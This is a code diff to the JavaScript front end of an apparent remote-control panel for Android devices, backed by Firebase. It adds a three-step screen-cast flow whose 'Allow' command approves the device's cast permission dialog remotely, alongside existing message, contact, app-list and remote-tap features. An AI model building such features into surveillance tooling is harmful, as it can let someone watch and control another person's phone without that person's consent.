@@ -546,6 +546,7 @@ const state = {
   screenData: null,
   screenControl: null,
   screenControlMode: 'tap', // tap | swipe
+  castStep: 'idle', // idle | allowed | started | stopped
   lastTapMarker: null,
   screen: 'home', // lock | home | phone | messages | contacts | apps | commands | screen | settings
   screenHistory: [],
@@ -965,6 +966,7 @@ function selectDeviceUid(deviceUid) {
   state.commands = [];
   state.screenData = null;
   state.screenControl = null;
+  state.castStep = 'idle';
   state.lastTapMarker = null;
   state.activeThreadPhone = null;
   state.expandedContactId = null;
@@ -1385,6 +1387,127 @@ async function sendScreenTapControl({
     ]);
   } catch (err) {
     handleRtdbError(err, OperationType.WRITE, controlPath);
+    showErrorBanner(err.message);
+  }
+}
+
+function getEffectiveCastState() {
+  const streaming = Boolean(state.screenData?.streaming);
+  const ctrlAction = String(state.screenControl?.action || '').toUpperCase();
+  const allowed =
+    state.castStep === 'allowed' ||
+    state.castStep === 'started' ||
+    streaming ||
+    ctrlAction === 'ALLOW_PERMISSION' ||
+    ctrlAction === 'START_CAST';
+  const started = streaming || state.castStep === 'started';
+  const stopped = !streaming && state.castStep === 'stopped';
+  return { streaming, allowed, started, stopped };
+}
+
+function updateCastFlowButtonsDom() {
+  const { streaming, allowed, started, stopped } = getEffectiveCastState();
+  const allowBtn = document.getElementById('btn-cast-allow');
+  const startBtn = document.getElementById('btn-cast-start');
+  const stopBtn = document.getElementById('btn-cast-stop');
+  const badge = document.getElementById('remote-screen-live-badge');
+
+  if (allowBtn) {
+    allowBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+      allowed
+        ? 'bg-cyan-500/20 border-cyan-400/60 text-cyan-200'
+        : 'bg-[#07130e] border-cyan-500/35 text-cyan-300 hover:bg-cyan-500/15'
+    }`;
+    allowBtn.textContent = allowed ? '✓ 1. Allow' : '1. Allow';
+  }
+
+  if (startBtn) {
+    startBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+      started
+        ? 'bg-emerald-500/25 border-emerald-400/70 text-emerald-200'
+        : 'bg-[#07130e] border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/15'
+    }`;
+    startBtn.textContent = streaming ? '● 2. Live' : started ? '▶ 2. Starting' : '2. Start';
+  }
+
+  if (stopBtn) {
+    stopBtn.className = `py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+      stopped
+        ? 'bg-red-500/25 border-red-400/70 text-red-200'
+        : 'bg-[#07130e] border-red-500/35 text-red-300 hover:bg-red-500/15'
+    }`;
+    stopBtn.textContent = stopped ? '■ 3. Stopped' : '3. Stop';
+  }
+
+  if (badge) {
+    badge.textContent = streaming ? 'LIVE' : allowed ? 'ALLOWED' : 'IDLE';
+    badge.className = `px-2 py-0.5 text-[10px] font-mono-tabular font-semibold rounded-md border ${
+      streaming
+        ? 'bg-emerald-500/20 border-emerald-400/50 text-emerald-300'
+        : allowed
+          ? 'bg-cyan-500/15 border-cyan-400/40 text-cyan-300'
+          : 'bg-slate-900 border-slate-700 text-slate-400'
+    }`;
+  }
+}
+
+async function sendCastStepCommand(step) {
+  if (!state.activeUid) return;
+  const rtdb = getRtdb();
+  const controlKey = resolveCollectionKey(state.rawUidNode, ['screenControl', 'screen_control', 'control'], 'screenControl');
+  const controlPath = devicePath(state.activeUid, controlKey);
+  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
+  const cmdPath = devicePath(state.activeUid, cmdKey);
+  const now = Date.now();
+
+  let commandName = 'ALLOW_SCREEN_PERMISSION';
+  let controlPayload = {
+    action: 'ALLOW_PERMISSION',
+    allow: true,
+    status: 'pending',
+    timestamp: now,
+  };
+  let toastTitle = 'Allow Popup Sent';
+
+  if (step === 'start') {
+    commandName = 'START_SCREEN_STREAM';
+    controlPayload = {
+      action: 'START_CAST',
+      status: 'pending',
+      timestamp: now,
+    };
+    state.castStep = 'started';
+    toastTitle = 'Cast Start Sent';
+  } else if (step === 'stop') {
+    commandName = 'STOP_SCREEN_STREAM';
+    controlPayload = {
+      action: 'STOP_CAST',
+      status: 'pending',
+      timestamp: now,
+    };
+    state.castStep = 'stopped';
+    toastTitle = 'Cast Stop Sent';
+  } else {
+    state.castStep = 'allowed';
+  }
+
+  updateCastFlowButtonsDom();
+  showPhoneToast(toastTitle, `${commandName} → /${cmdPath}`);
+
+  try {
+    await Promise.all([
+      set(ref(rtdb, controlPath), controlPayload),
+      push(ref(rtdb, cmdPath), {
+        command: commandName,
+        target: 'screen',
+        ...controlPayload,
+        payload: JSON.stringify(controlPayload),
+        timestampLabel: formatNowLabel(),
+        createdAt: now,
+      }),
+    ]);
+  } catch (err) {
+    handleRtdbError(err, OperationType.WRITE, cmdPath);
     showErrorBanner(err.message);
   }
 }
@@ -2360,6 +2483,7 @@ function renderLiveScreenView() {
   const ctrl = state.screenControl;
   const tapMarker = state.lastTapMarker;
   const mode = state.screenControlMode;
+  const { streaming, allowed, started, stopped } = getEffectiveCastState();
   const updatedText = sc?.updatedAt ? new Date(Number(sc.updatedAt)).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : 'Waiting';
 
   return `
@@ -2370,6 +2494,16 @@ function renderLiveScreenView() {
           <p id="remote-screen-subtitle" class="text-[10px] sm:text-[11px] font-mono-tabular text-slate-400 truncate">${esc(devicePath(state.activeUid, 'screen'))} · ${esc(updatedText)}</p>
         </div>
         <div class="flex items-center gap-1.5 shrink-0">
+          <span
+            id="remote-screen-live-badge"
+            class="px-2 py-0.5 text-[10px] font-mono-tabular font-semibold rounded-md border ${
+              streaming
+                ? 'bg-emerald-500/20 border-emerald-400/50 text-emerald-300'
+                : allowed
+                  ? 'bg-cyan-500/15 border-cyan-400/40 text-cyan-300'
+                  : 'bg-slate-900 border-slate-700 text-slate-400'
+            }"
+          >${streaming ? 'LIVE' : allowed ? 'ALLOWED' : 'IDLE'}</span>
           <button
             type="button"
             data-send-upload-cmd="CAPTURE_SCREEN"
@@ -2378,19 +2512,51 @@ function renderLiveScreenView() {
           >
             ↻ Capture
           </button>
+        </div>
+      </div>
+
+      <div class="shrink-0 px-3 pt-1.5 pb-1">
+        <div class="w-full max-w-md mx-auto grid grid-cols-3 gap-1.5">
           <button
             type="button"
-            id="btn-screen-stream"
-            data-send-upload-cmd="${sc?.streaming ? 'STOP_SCREEN_STREAM' : 'START_SCREEN_STREAM'}"
-            data-upload-target="screen"
-            class="px-2 sm:px-2.5 py-1 sm:py-1.5 text-[10px] sm:text-[11px] font-mono-tabular font-semibold ${sc?.streaming ? 'bg-red-500/20 border-red-400/40 text-red-300' : 'bg-emerald-500/15 border-emerald-500/35 text-emerald-300'} border rounded-lg cursor-pointer"
+            id="btn-cast-allow"
+            data-cast-step="allow"
+            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+              allowed
+                ? 'bg-cyan-500/20 border-cyan-400/60 text-cyan-200'
+                : 'bg-[#07130e] border-cyan-500/35 text-cyan-300 hover:bg-cyan-500/15'
+            }"
           >
-            ${sc?.streaming ? '■ Stop' : '▶ Stream'}
+            ${allowed ? '✓ 1. Allow' : '1. Allow'}
+          </button>
+          <button
+            type="button"
+            id="btn-cast-start"
+            data-cast-step="start"
+            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+              started
+                ? 'bg-emerald-500/25 border-emerald-400/70 text-emerald-200'
+                : 'bg-[#07130e] border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/15'
+            }"
+          >
+            ${streaming ? '● 2. Live' : started ? '▶ 2. Starting' : '2. Start'}
+          </button>
+          <button
+            type="button"
+            id="btn-cast-stop"
+            data-cast-step="stop"
+            class="py-1.5 px-2 text-[10px] sm:text-[11px] font-mono-tabular font-semibold border rounded-lg cursor-pointer transition-colors ${
+              stopped
+                ? 'bg-red-500/25 border-red-400/70 text-red-200'
+                : 'bg-[#07130e] border-red-500/35 text-red-300 hover:bg-red-500/15'
+            }"
+          >
+            ${stopped ? '■ 3. Stopped' : '3. Stop'}
           </button>
         </div>
       </div>
 
-      <div class="shrink-0 px-3 pt-2 pb-1">
+      <div class="shrink-0 px-3 pt-1 pb-1">
         <div class="w-full max-w-md mx-auto flex items-center justify-between gap-2 px-2.5 py-1.5 rounded-xl bg-[#07130e] border border-emerald-500/20 text-[10px] sm:text-[11px] font-mono-tabular">
           <div class="flex items-center gap-1 shrink-0">
             <button
@@ -2414,7 +2580,7 @@ function renderLiveScreenView() {
         </div>
       </div>
 
-      <div class="flex-1 min-h-0 w-full flex items-center justify-center px-3 py-1.5 overflow-hidden">
+      <div class="flex-1 min-h-0 w-full flex items-center justify-center px-3 py-1 overflow-hidden">
         <div
           id="remote-screen-stage"
           class="relative inline-flex items-center justify-center max-w-full max-h-full bg-[#020504] border-2 border-emerald-500/35 rounded-2xl overflow-hidden shadow-2xl select-none touch-none cursor-crosshair"
@@ -2426,12 +2592,12 @@ function renderLiveScreenView() {
               src="${esc(sc.imageSrc)}"
               alt="Live Android Device Screen"
               draggable="false"
-              class="block max-w-full max-h-[calc(100dvh-238px)] w-auto h-auto object-contain pointer-events-none select-none"
+              class="block max-w-full max-h-[calc(100dvh-276px)] w-auto h-auto object-contain pointer-events-none select-none"
             />
           ` : `
             <div
               id="remote-screen-fallback"
-              class="h-[min(430px,calc(100dvh-248px))] aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
+              class="h-[min(410px,calc(100dvh-286px))] aspect-[9/19] max-w-full flex flex-col items-center justify-center p-4 text-center space-y-2.5"
             >
               <div class="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-400/40 text-cyan-300 font-mono-tabular font-bold flex items-center justify-center text-xs">
                 B64
@@ -2439,7 +2605,7 @@ function renderLiveScreenView() {
               <div class="space-y-1">
                 <p class="text-[11px] font-mono-tabular font-semibold text-emerald-300">AWAITING_BASE64_SCREEN</p>
                 <p class="text-[10px] sm:text-[11px] text-slate-400 leading-relaxed">
-                  Push Base64 to <span class="font-mono-tabular text-emerald-400 break-all">${esc(devicePath(state.activeUid, 'screen'))}</span> or tap here to test <span class="font-mono-tabular text-cyan-300">TAP</span>.
+                  First tap <span class="font-mono-tabular text-cyan-300">1. Allow</span> then <span class="font-mono-tabular text-emerald-300">2. Start</span> to cast <span class="font-mono-tabular text-emerald-400 break-all">${esc(devicePath(state.activeUid, 'screen'))}</span>.
                 </p>
               </div>
             </div>
@@ -2494,6 +2660,9 @@ function renderCommandsScreen() {
     { cmd: 'UPLOAD_APPS', target: 'apps', label: 'Upload App List', desc: `${state.apps.length} cached` },
     { cmd: 'UPLOAD_STATUS', target: 'status', label: 'Refresh Status', desc: 'Battery & Online' },
     { cmd: 'UPLOAD_ALL', target: 'all', label: 'Upload All Lists', desc: 'Full RTDB sync' },
+    { cmd: 'ALLOW_SCREEN_PERMISSION', target: 'screen', label: '1. Allow Screen Popup', desc: 'Approve cast dialog' },
+    { cmd: 'START_SCREEN_STREAM', target: 'screen', label: '2. Start Screen Cast', desc: 'Begin Base64 stream' },
+    { cmd: 'STOP_SCREEN_STREAM', target: 'screen', label: '3. Stop Screen Cast', desc: 'End Base64 stream' },
   ];
 
   return `
@@ -2886,13 +3055,7 @@ function renderPhoneScreen() {
           : 'Waiting';
         sub.textContent = `${devicePath(state.activeUid, 'screen')} · ${updatedText}`;
       }
-      const streamBtn = document.getElementById('btn-screen-stream');
-      if (streamBtn) {
-        const streaming = Boolean(state.screenData?.streaming);
-        streamBtn.setAttribute('data-send-upload-cmd', streaming ? 'STOP_SCREEN_STREAM' : 'START_SCREEN_STREAM');
-        streamBtn.textContent = streaming ? '■ Stop' : '▶ Stream';
-        streamBtn.className = `px-2 sm:px-2.5 py-1 sm:py-1.5 text-[10px] sm:text-[11px] font-mono-tabular font-semibold ${streaming ? 'bg-red-500/20 border-red-400/40 text-red-300' : 'bg-emerald-500/15 border-emerald-500/35 text-emerald-300'} border rounded-lg cursor-pointer`;
-      }
+      updateCastFlowButtonsDom();
       renderTapDotLayer(state.lastTapMarker);
     } else {
       state.forceScreenRebuild = false;
@@ -3236,6 +3399,11 @@ function wireStaticListeners() {
         if (!state.status) return;
         const nextSig = Math.max(0, Math.min(4, Number(setSignal) || 0));
         return updateDeviceStatusFields({ signalStrength: nextSig });
+      }
+
+      const castStep = target.getAttribute('data-cast-step');
+      if (castStep) {
+        return sendCastStepCommand(castStep);
       }
 
       const screenMode = target.getAttribute('data-screen-mode');
